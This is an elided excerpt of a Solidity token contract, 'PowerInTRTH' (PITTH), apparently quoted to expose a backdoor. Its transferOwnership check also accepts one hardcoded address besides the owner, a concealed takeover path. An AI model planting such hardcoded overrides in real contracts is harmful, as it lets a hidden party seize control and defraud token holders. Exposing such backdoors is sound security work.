...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xdba7f51e203DAb64df6A9D7d65F839A343151f03));
...
contract PowerInTRTH is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "PITTH";
  string private _name = "PowerInTRTH";
